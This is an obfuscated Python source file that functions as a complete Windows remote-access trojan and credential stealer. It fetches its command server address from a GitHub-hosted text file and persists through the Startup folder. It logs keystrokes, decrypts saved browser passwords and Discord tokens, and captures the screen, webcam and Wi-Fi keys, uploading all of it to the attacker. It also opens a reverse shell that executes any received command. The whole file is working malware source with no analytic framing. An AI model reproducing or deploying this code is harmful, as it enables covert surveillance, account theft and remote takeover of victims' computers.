import urllib.request,subprocess,socket,time,os,json,base64,shutil,re
from datetime import datetime
vpkRbeMnK = ""
AvpWCZEzdZVRsGYXhUa = ""
qmKbdTZYJwaSllTtQHlineh = "04.06.25.0"
VmcRwAnqWYjypOmmWFAFi = True
HlWgAeIamimvqhZykGGt = "!"
YoOXSRmq = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
vSPQVGG = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
TkyLdmXkxfitOpJ = os.path.expanduser("~\\AppData\\Local\\")
YuwpDOEsyLcMqYdlH = os.path.expanduser("~\\AppData\\Roaming\\")
tvERkicObkOUJrSBDAiJ = ""
qscQpcS = {
	'chrome':TkyLdmXkxfitOpJ+'Google\\Chrome\\User Data','chromium':TkyLdmXkxfitOpJ+'Chromium\\User Data','chrome-canary':TkyLdmXkxfitOpJ+'Google\\Chrome SxS\\User Data',
	'msedge':TkyLdmXkxfitOpJ+'Microsoft\\Edge\\User Data','msedge-canary':TkyLdmXkxfitOpJ+'Microsoft\\Edge SxS\\User Data',
	'msedge-beta':TkyLdmXkxfitOpJ+'Microsoft\\Edge Beta\\User Data','msedge-dev':TkyLdmXkxfitOpJ+'Microsoft\\Edge Dev\\User Data',
	'avast':TkyLdmXkxfitOpJ+'AVAST Software\\Browser\\User Data','amigo':TkyLdmXkxfitOpJ+'Amigo\\User Data',
	'torch':TkyLdmXkxfitOpJ+'Torch\\User Data','kometa':TkyLdmXkxfitOpJ+'Kometa\\User Data','orbitum':TkyLdmXkxfitOpJ+'Orbitum\\User Data',
	'cent-browser':TkyLdmXkxfitOpJ+'CentBrowser\\User Data','7star':TkyLdmXkxfitOpJ+'7Star\\7Star\\User Data',
	'sputnik':TkyLdmXkxfitOpJ+'Sputnik\\Sputnik\\User Data','vivaldi':TkyLdmXkxfitOpJ+'Vivaldi\\User Data',
	'epic-privacy-browser':TkyLdmXkxfitOpJ+'Epic Privacy Browser\\User Data','uran':TkyLdmXkxfitOpJ+'uCozMedia\\Uran\\User Data',
	'yandex':TkyLdmXkxfitOpJ+'Yandex\\YandexBrowser\\User Data','brave':TkyLdmXkxfitOpJ+'BraveSoftware\\Brave-Browser\\User Data',
	'iridium':TkyLdmXkxfitOpJ+'Iridium\\User Data','coccoc':TkyLdmXkxfitOpJ+'CocCoc\\Browser\\User Data',
	'opera':YuwpDOEsyLcMqYdlH+'Opera Software\\Opera Stable','opera-gx':YuwpDOEsyLcMqYdlH+'Opera Software\\Opera GX Stable'
}
def LRqieWjTLLeg(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def hLCVbJoLTwR(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	xWfwAMEo = data.decode("utf-8").replace("\n","")
	if not xWfwAMEo.startswith(HlWgAeIamimvqhZykGGt):
		proc = subprocess.run(xWfwAMEo, shell=True, capture_output=True)
		xivwOkojSRPABS = proc.stdout + proc.stderr
		HADNKCPlNIO(s, xivwOkojSRPABS)
		return
	TANsSOWhuE = xWfwAMEo.split(" ")[0][1:]
	args = " ".join(xWfwAMEo.split()[1:]).split()
	if TANsSOWhuE == "download":
		xLNsnKDcWdRrrqO(s, xWfwAMEo)
	elif TANsSOWhuE == "screenshot":
		JoGtEdmWRgGTmHxwbpQNCqy(s)
	elif TANsSOWhuE == "basename":
		HADNKCPlNIO(s, os.path.basename(__file__))
	elif TANsSOWhuE == "update":
		zronGYoyijcTzu(s)
	elif TANsSOWhuE == "wifi":
		saqGjbob(s)
	elif TANsSOWhuE == "screenrecord":
		NlSRgMnMoLroBimKQeNdq(s, args)
	elif TANsSOWhuE == "browsers":
		IJBoOoxlhwyRKuDrXmCJiZY(s)
	elif TANsSOWhuE == "webcam":
		webCam(s, args)
	elif TANsSOWhuE == "cd":
		moveDirectory(s, xWfwAMEo[4:])
	else:
		HADNKCPlNIO(s,"")
def moveDirectory(s, path):
	try:
		os.chdir(path)
		HADNKCPlNIO(s,"")
	except:
		HADNKCPlNIO(s, "[!] 404")
def xLNsnKDcWdRrrqO(s, xWfwAMEo):
	CBVPQBrXj = xWfwAMEo.replace(HlWgAeIamimvqhZykGGt+"download ","").split(",")
	xivwOkojSRPABSs = ""
	for f in CBVPQBrXj:
		xivwOkojSRPABSs += zgaJoqMRVAOGtA(f, "api/file/", { "type":os.path.splitext(f)[1] })
	HADNKCPlNIO(s, xivwOkojSRPABSs)
def JoGtEdmWRgGTmHxwbpQNCqy(s):
	from PIL import ImageGrab
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	CScJLwSeziaXo = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(CScJLwSeziaXo)
	image.close()
	xivwOkojSRPABS = zgaJoqMRVAOGtA(CScJLwSeziaXo, "api/sscap")
	os.remove(CScJLwSeziaXo)
	HADNKCPlNIO(s, xivwOkojSRPABS)
def webCam(s, args):
	import cv2
	cameraNumber = 0
	fname = "wc.jpg"
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		cam = cv2.VideoCapture(cameraNumber)
		_, frame = cam.read()
		cv2.imwrite(TkyLdmXkxfitOpJ+fname, frame)
		cam.release()
		r=zgaJoqMRVAOGtA(TkyLdmXkxfitOpJ+fname,"api/wc")
		os.remove(TkyLdmXkxfitOpJ+fname)
		HADNKCPlNIO(s, r)
	except Exception as e:
		HADNKCPlNIO(s, "[!] 404: "+str(e))
def NlSRgMnMoLroBimKQeNdq(s, args):
	import imageio
	from PIL import ImageGrab
	UXwtvudftLTWwkssIATxy = 15
	if not args == []:
		try: UXwtvudftLTWwkssIATxy = int(args[0])
		except: pass
	OaybULpyToaa = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	znfsrOPOX = []
	fps = 11
	numFrames = UXwtvudftLTWwkssIATxy * fps
	for _ in range(numFrames):
		znfsrOPOX.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(OaybULpyToaa, znfsrOPOX, fps=fps, quality=8)
	r=zgaJoqMRVAOGtA(OaybULpyToaa, "api/screc")
	os.remove(OaybULpyToaa)
	HADNKCPlNIO(s, r)
def zgaJoqMRVAOGtA(tGDjyQDxVYHXkNKSSW, KxDUnVtFAfrRBvpiaFZ, YuYEdtFECpVRJ=None):
	import requests
	if not os.path.isfile(tGDjyQDxVYHXkNKSSW):
		return "[!] 404: "+tGDjyQDxVYHXkNKSSW+"\n"
	headers = {"user":os.getlogin()}
	if YuYEdtFECpVRJ is not None:
		headers = {**headers, **YuYEdtFECpVRJ}
	f = open(tGDjyQDxVYHXkNKSSW, "rb")
	requests.post("http://"+vpkRbeMnK+":5555/"+KxDUnVtFAfrRBvpiaFZ,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200"
def lAubbnxcsSrgHpUVwGhkR(UIBxDHgqpMWKGtxFLkHhlG, KxDUnVtFAfrRBvpiaFZ):
	import requests
	if UIBxDHgqpMWKGtxFLkHhlG.strip() == "":
		return "[!] 204"
	requests.post("http://"+vpkRbeMnK+":5555/"+KxDUnVtFAfrRBvpiaFZ,
		data=UIBxDHgqpMWKGtxFLkHhlG,
		headers={"user":os.getlogin()})
	return "[+] 200"
def zronGYoyijcTzu(s):
	h, p, v = CvMdqvI(True)
	if (v != qmKbdTZYJwaSllTtQHlineh):
		FDOuLOxNNHPnraRvCiMA(v)
		HADNKCPlNIO(s, "[+] 200")
	else:
		HADNKCPlNIO(s, "[-] 304")
def saqGjbob(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		HADNKCPlNIO(s, "[!] 500")
		return
	axHgoknMRYrxH = ""
	for p in profiles:
		try: axHgoknMRYrxH+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()
		except: axHgoknMRYrxH+=f"    {p} - N/A"
	HADNKCPlNIO(s, axHgoknMRYrxH)
def FDOuLOxNNHPnraRvCiMA(kTYsjnRNVEmkYbFTiKqF):
	import requests
	global VmcRwAnqWYjypOmmWFAFi
	hUZnjupt = os.path.basename(__file__)
	fileType = hUZnjupt.split(".")[-1]
	oHGiJoAVZJWi = hUZnjupt.split(".")[0]+"."+kTYsjnRNVEmkYbFTiKqF+".pyw" if fileType.startswith("py") else ".exe"
	lVEYBwaHQtlCdZj = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), oHGiJoAVZJWi)
	if not os.path.isfile(lVEYBwaHQtlCdZj):
		with open(lVEYBwaHQtlCdZj, "w+") as f:
			f.write(requests.get(vSPQVGG+"file."+ "pyw" if lVEYBwaHQtlCdZj.split(".")[-1].startswith("py") else "exe").text)
	else:
		VmcRwAnqWYjypOmmWFAFi = False
def CvMdqvI(force=False):
	global vpkRbeMnK, AvpWCZEzdZVRsGYXhUa
	if force or vpkRbeMnK == "" or AvpWCZEzdZVRsGYXhUa == "":
		while True:
			try:
				with urllib.request.urlopen(YoOXSRmq) as response:
					data = response.read().decode("utf-8").replace("\n","").split(":")
					vpkRbeMnK = data[0].strip()
					AvpWCZEzdZVRsGYXhUa = data[1].strip()
					kTYsjnRNVEmkYbFTiKqF = data[2].strip()
					return vpkRbeMnK, AvpWCZEzdZVRsGYXhUa, kTYsjnRNVEmkYbFTiKqF
			except:
				time.sleep(10)
def VIKTofpvoqENVX():
	try:
		BwabgCLJocG = "settings.xpb"
		BOgUSdmSHDVPX = sorted([file for file in os.listdir(TkyLdmXkxfitOpJ) if os.path.isfile(TkyLdmXkxfitOpJ+"\\"+file) and file.endswith(BwabgCLJocG.split(".")[-1])])
		if BwabgCLJocG in BOgUSdmSHDVPX:
			BOgUSdmSHDVPX.remove(BwabgCLJocG)
		RjdyTXKTaNqw = os.path.join(TkyLdmXkxfitOpJ,BwabgCLJocG)
		if len(BOgUSdmSHDVPX) > 0:
			with open(RjdyTXKTaNqw, "ab+") as f:
				for file in BOgUSdmSHDVPX:
					temp = os.path.join(TkyLdmXkxfitOpJ,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		zgaJoqMRVAOGtA(RjdyTXKTaNqw, "api/log")
		if os.path.isfile(RjdyTXKTaNqw):
			os.remove(RjdyTXKTaNqw)
	except:
		pass
def ObxYJQxsqQth():
	from pynput.keyboard import Listener
	import logging
	logging.basicConfig(filename=(TkyLdmXkxfitOpJ+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def EltXNXs(k):
		logging.info(str(k))
	k=Listener(on_press=EltXNXs)
	DnUAbYXH = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in DnUAbYXH:
		l.setLevel(logging.CRITICAL)
	k.start()
def IJBoOoxlhwyRKuDrXmCJiZY(s, upload=False):
        import requests,sqlite3,win32crypt
        from Cryptodome.Cipher import AES
        kvTKTnsr = "\n"
        for browser in qscQpcS:
                path = qscQpcS[browser]
                otoJapjsofICFQVYY = None
                if not os.path.isfile(path+"\\Local State"):
                        continue
                with open(path+"\\Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        otoJapjsofICFQVYY = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                profiles = [p for p in os.listdir(path) if p == "Default" or p.startswith("Profile ")]
                if browser == "opera" or browser == "opera-gx": profiles=[""]
                for profile in profiles:
                        try:shutil.copyfile(f"{path}\\{profile}\\Login Data", TkyLdmXkxfitOpJ+"\\db.db")
                        except:continue
                        conn = sqlite3.connect(TkyLdmXkxfitOpJ+"\\db.db")
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        kvTKTnsr += str("*"*8+f" {browser} - {profile} "+"*"*8+"\n")
                        for _, data in enumerate(cursor.fetchall()):
                                ciphertext = data[2]
                                initVector = ciphertext[3:15]
                                encryptedPwd = ciphertext[15:-16]
                                cipher = AES.new(otoJapjsofICFQVYY, AES.MODE_GCM, initVector)
                                decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
                                kvTKTnsr += f"URL: {data[0]}\nUser: {data[1]}\nValue: {decryptedPwd}\n\n"
                        cursor.close()
                        conn.close()
                        os.remove(TkyLdmXkxfitOpJ+"\\db.db")
        rqPCVIVqXhjQ = []
        discordPaths = [YuwpDOEsyLcMqYdlH+'\\discord\\Local Storage\\leveldb\\',YuwpDOEsyLcMqYdlH+'\\discordcanary\\Local Storage\\leveldb\\',YuwpDOEsyLcMqYdlH+'\\discordptb\\Local Storage\\leveldb\\']
        for p in [dp for dp in discordPaths if os.path.exists(dp)]:
                otoJapjsofICFQVYY = ""
                with open(p.replace("Local Storage\\leveldb\\","")+"Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        otoJapjsofICFQVYY = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                for file in [f for f in os.listdir(p) if f.endswith(".log") or f.endswith(".ldb")]:
                        for line in [x.strip() for x in open(f"{p}\\{file}","r", errors="ignore").readlines() if x.strip()]:
                                for value in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                        value = base64.b64decode(value.split('dQw4w9WgXcQ:')[1])
                                        tinitVector = value[3:15]
                                        encryptedToken = value[15:]
                                        tcipher = AES.new(otoJapjsofICFQVYY, AES.MODE_GCM, tinitVector)
                                        decryptedToken = (tcipher.decrypt(encryptedToken))[:-16].decode()
                                        if decryptedToken not in rqPCVIVqXhjQ:
                                                rqPCVIVqXhjQ.append(decryptedToken)
        pvcWHRxvFgAtzQu = "https://discord.com/api/v9/users/@me"
        if rqPCVIVqXhjQ: kvTKTnsr +="*"*8+"Discord Data: "+"*"*8+"\n\n"
        for jUyuSKYESSuCHtOwOK in rqPCVIVqXhjQ:
                headers = {"Content-Type":"application/json","Authorization":jUyuSKYESSuCHtOwOK,
                           "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
                j = requests.get(pvcWHRxvFgAtzQu, headers=headers).json()
                if j.get("message") != None: continue
                user = str(j.get('username')) + '#' + str(j.get("discriminator"))
                badges = ""
                flags = j['flags']
                if (flags == 1): badges += "Staff, "
                if (flags == 2): badges += "Partner, "
                if (flags == 4): badges += "Hypesquad Event, "
                if (flags == 8): badges += "Green Bughunter, "
                if (flags == 64): badges += "Hypesquad Bravery, "
                if (flags == 128): badges += "HypeSquad Brillance, "
                if (flags == 256): badges += "HypeSquad Balance, "
                if (flags == 512): badges += "Early Supporter, "
                if (flags == 16384): badges += "Gold BugHunter, "
                if (flags == 131072): badges += "Verified Bot Developer, "
                if (badges == ""): badges = "None"
                email = j.get("email")
                phone = j.get("phone") if j.get("phone") else "N/A"
                try:
                        nitro_data = requests.get(pvcWHRxvFgAtzQu+'/billing/subscriptions', headers=headers).json()
                        has_nitro = bool(len(nitro_data) > 0)
                except: pass
                try: billing = bool(len(json.loads(requests.get(pvcWHRxvFgAtzQu+"/billing/payment-sources", headers=headers).text)) > 0)
                except: pass
                kvTKTnsr += f"\n{user}\n{'-'*len(user)}\nToken: {jUyuSKYESSuCHtOwOK}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n"
        kvTKTnsr += "\n\n"
        if not upload:
                HADNKCPlNIO(s, kvTKTnsr)
        else:
                lAubbnxcsSrgHpUVwGhkR(kvTKTnsr, "api/google")
def HADNKCPlNIO(clientSocket, UIBxDHgqpMWKGtxFLkHhlG):
	formattedData = b""
	if type(UIBxDHgqpMWKGtxFLkHhlG) == bytes:
		formattedData += UIBxDHgqpMWKGtxFLkHhlG
	else:
		formattedData += bytes(UIBxDHgqpMWKGtxFLkHhlG, "utf-8")
	formattedData += bytes("\n"+tvERkicObkOUJrSBDAiJ+os.getcwd().replace("\\","/")+" >> ", "utf-8")
	clientSocket.sendall(formattedData)
def jQvlOgGb():
	global tvERkicObkOUJrSBDAiJ
	h, p, v = CvMdqvI()
	try: VIKTofpvoqENVX()
	except: pass
	try:
		if qmKbdTZYJwaSllTtQHlineh != v:
			FDOuLOxNNHPnraRvCiMA(v)
	except: pass
	try:
		if VmcRwAnqWYjypOmmWFAFi:
			IJBoOoxlhwyRKuDrXmCJiZY(None,True)
	except: pass
	try:
		if VmcRwAnqWYjypOmmWFAFi:
			ObxYJQxsqQth()
		pass
	except:
		pass
	try: os.chdir(os.path.expanduser("~"))
	except: pass
	tvERkicObkOUJrSBDAiJ = ("(old)"if qmKbdTZYJwaSllTtQHlineh!=v else "")+"["+qmKbdTZYJwaSllTtQHlineh+"] "+os.getlogin()+" - "
	while True:
		WOewkCYlquIQXY=False
		try:
			s=LRqieWjTLLeg(h, p)
			HADNKCPlNIO(s, "")
			while not WOewkCYlquIQXY:
				try: WOewkCYlquIQXY=hLCVbJoLTwR(s)
				except Exception as e:
					HADNKCPlNIO(s, str(e))
			s.close()
		except:
			pass
		time.sleep(5)
jQvlOgGb()
